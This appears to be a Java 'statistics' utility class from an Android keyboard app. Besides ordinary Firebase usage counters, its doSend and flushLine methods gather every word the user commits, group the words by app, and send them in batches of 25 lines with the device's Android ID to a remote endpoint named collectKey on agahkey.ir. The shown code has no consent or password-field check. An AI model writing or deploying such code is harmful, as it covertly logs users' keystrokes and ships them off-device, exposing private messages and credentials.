package io.separ.neural.inputmethod.Utils;

import android.content.Context;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.util.SparseArray;
import android.view.inputmethod.InputMethodSubtype;

import com.google.firebase.analytics.FirebaseAnalytics;
import com.squareup.okhttp.Call;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.HttpUrl;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import io.separ.neural.inputmethod.indic.DictionaryFacilitator;
import io.separ.neural.inputmethod.indic.SuggestedWords;

import static com.google.firebase.analytics.FirebaseAnalytics.Event.SELECT_CONTENT;
import static com.google.firebase.analytics.FirebaseAnalytics.Param.ITEM_ID;

/**
 * Created by sepehr on 3/11/17.
 */

public final class StatsUtils {

    private int revertSwapPuncCount, revertAutoCorrectCount, wordUserTypedCount,
            autoCorrectTypedCount, pickSuggestionCount, backspaceWordDeleteCount,
            backspaceDeleteCount, wordUserTypedBatchCount, autoCorrectTypedBacthCount,
            pickSuggestionBatchCount, subtypeChangeCount, topEmojiSelectedCount,
            richEmojiSelectedCount, snippetToolSelectedCount;

    final int BATCH_SIZE = 25;
    final static MediaType JSON = MediaType.parse("application/json; charset=utf-8");
    final OkHttpClient client;
    HttpUrl.Builder urlBuilder = null;
    String apiUrl;

    private SparseArray<ArrayList<String>> app2lines = new SparseArray<>();
    private StringBuilder currentLine = new StringBuilder();
    private int numOfLines = 0;

    private static String checkSum(String s) {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException ignored) {
        }
        byte[] digest = md.digest(s.getBytes());
        BigInteger bigInteger = new BigInteger(1, digest);
        String hash = bigInteger.toString(16);
        while(hash.length()<32){
            hash = "0"+hash;
        }
        return hash;
    }

    private void doSend(final SparseArray<ArrayList<String>> batch){
        Log.d("AGAH", "doSendCalled");
        if(batch == null || batch.size() == 0) {
            return;
        }
        if(urlBuilder == null) {
            urlBuilder = HttpUrl.parse("https://agahkey.ir/api/v0/collectKey").newBuilder();
            apiUrl = urlBuilder.build().toString();
        }
        JSONObject json = new JSONObject();
        long time = System.currentTimeMillis();
        JSONObject events = new JSONObject();
        for(int i = 0; i < batch.size(); i++) {
            int key = batch.keyAt(i);
            ArrayList<String> obj = batch.get(key);
            JSONArray lines = new JSONArray(obj);
            try {
                events.put(Integer.toString(key), lines);
            } catch (JSONException e) {
                e.printStackTrace();
                return;
            }
        }
        try {
            json.put("devId", Settings.Secure.getString(latin.getContentResolver(), Settings.Secure.ANDROID_ID));
            json.put("time", time);
            json.put("events", batch);
            String concatenated = Settings.Secure.getString(latin.getContentResolver(), Settings.Secure.ANDROID_ID) + Long.toString(time) + batch.toString();
            json.put("check", checkSum(concatenated));
        }catch (Throwable t){
            return;
        }
        Log.d("AGAH", "requestSent");
        RequestBody body = RequestBody.create(JSON, json.toString());
        Request request = new Request.Builder().url(apiUrl).post(body).build();
        Call call = client.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                Log.d("AGAH", e.toString());
            }

            @Override
            public void onResponse(Response response) throws IOException {
                Log.d("AGAH", "success");
            }
        });
    }

    private void addWordToline(String newWord){
        currentLine.append(newWord).append(" ");
    }
    private void flushLine(Integer app){
        if(app2lines.get(app) == null)
            app2lines.put(app, new ArrayList<String>());
        app2lines.get(app).add(currentLine.toString());
        currentLine = new StringBuilder();
        numOfLines += 1;
        if(numOfLines >= BATCH_SIZE){
            doSend(app2lines.clone());
            app2lines.clear();
            numOfLines = 0;
        }
    }

    public void updatePackageName(String currentPackageName) {
        final int previousHash = currentPackageHash;
        currentPackageHash = currentPackageName.hashCode();
        if(currentLine.length() == 0)
            return;
        flushLine(previousHash);
    }

    public Context latin;

    private FirebaseAnalytics mFirebaseAnalytics;

    private StatsUtils() {
        client = new OkHttpClient();
    }

    private static StatsUtils instance = null;

    public static StatsUtils getInstance(){
        if(instance == null)
            instance = new StatsUtils();
        return instance;
    }

    public void onCreate(final Context givenLatin) {
        latin = givenLatin;
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(latin);
    }

    public void onPickSuggestionManually(final SuggestedWords suggestedWords,
                                                final SuggestedWords.SuggestedWordInfo suggestionInfo,
                                                final DictionaryFacilitator dictionaryFacilitator) {
    }

    public void onBackspaceWordDelete(int wordLength) {
        backspaceWordDeleteCount=createCountLog(backspaceWordDeleteCount, 50, "onBackspaceWordDelete");
    }

    public void onBackspacePressed(int lengthToDelete) {
        backspaceDeleteCount=createCountLog(backspaceDeleteCount, 500, "onBackspacePressed");
    }

    public void onBackspaceSelectedText(int selectedTextLength) {
    }

    public void onDeleteMultiCharInput(int multiCharLength) {
    }

    public void onRevertAutoCorrect() {
        revertAutoCorrectCount=createCountLog(revertAutoCorrectCount, 50, "onRevertAutoCorrect");
    }

    public void onTopEmojiSelected(){
        topEmojiSelectedCount=createCountLog(topEmojiSelectedCount, 5, "onTopEmojiSelected");
    }

    public void onRichEmojiSelected(){
        richEmojiSelectedCount=createCountLog(richEmojiSelectedCount, 5, "onRichEmojiSelected");
    }

    public void onSnippetToolSelected(){
        snippetToolSelectedCount=createCountLog(snippetToolSelectedCount, 5, "onSnippetToolSelected");
    }

    private int createCountLog(int updated, int threshold, String id){
        if(mFirebaseAnalytics == null)
            return 0;
        updated++;
        if(updated >= threshold){
            Bundle bundle = new Bundle();
            bundle.putString(ITEM_ID, id);
            mFirebaseAnalytics.logEvent(SELECT_CONTENT, bundle);
            updated = 0;
        }
        return updated;
    }

    public void onRevertSwapPunctuation() {
        revertSwapPuncCount=createCountLog(revertSwapPuncCount, 50, "onRevertSwapPunctuation");
    }

    public void onCreateInputView() {
    }

    public void onStartInputView(int inputType, int displayOrientation, boolean restarting) {
    }

    public void onAutoCorrection(final String typedWord, final String autoCorrectionWord,
                                        final boolean isBatchInput, final DictionaryFacilitator dictionaryFacilitator,
                                        final String prevWordsContext) {
    }

    private void addWord(final String commitWord){
        if(TextUtils.isEmpty(commitWord))
            return;
        addWordToline(commitWord);
    }

    public void onWordCommitUserTyped(final String commitWord, final boolean isBatchMode) {
        addWord(commitWord);
        if(isBatchMode)
            wordUserTypedBatchCount=createCountLog(wordUserTypedBatchCount, 500, "onWordCommitUserBatchTyped");
        else
            wordUserTypedCount=createCountLog(wordUserTypedCount, 500, "onWordCommitUserTyped");
    }

    public void onWordCommitAutoCorrect(final String commitWord, final boolean isBatchMode) {
        addWord(commitWord);
        if(isBatchMode)
            autoCorrectTypedBacthCount=createCountLog(autoCorrectTypedBacthCount, 500, "onWordCommitBatchAutoCorrect");
        else
            autoCorrectTypedCount=createCountLog(autoCorrectTypedCount, 500, "onWordCommitAutoCorrect");
    }

    public void onWordCommitSuggestionPickedManually(
            final String commitWord, final boolean isBatchMode) {
        addWord(commitWord);
        if(isBatchMode)
            pickSuggestionBatchCount=createCountLog(pickSuggestionBatchCount, 500, "onPickSuggestionBatchManually");
        else
            pickSuggestionCount=createCountLog(pickSuggestionCount, 500, "onPickSuggestionManually");
    }

    public void onSubtypeChanged(final InputMethodSubtype newSubtype) {
        subtypeChangeCount=createCountLog(subtypeChangeCount, 500, "onSubtypeChanged");
    }

    public void onDestroy() {
        instance = null;
    }

    private int currentPackageHash = 0;

    public static boolean hasInstance() {
        return (instance!=null);
    }

    public void onServiceClicked(String serviceId) {
        Bundle bundle = new Bundle();
        bundle.putString(ITEM_ID, serviceId);
        mFirebaseAnalytics.logEvent(SELECT_CONTENT, bundle);
    }
}
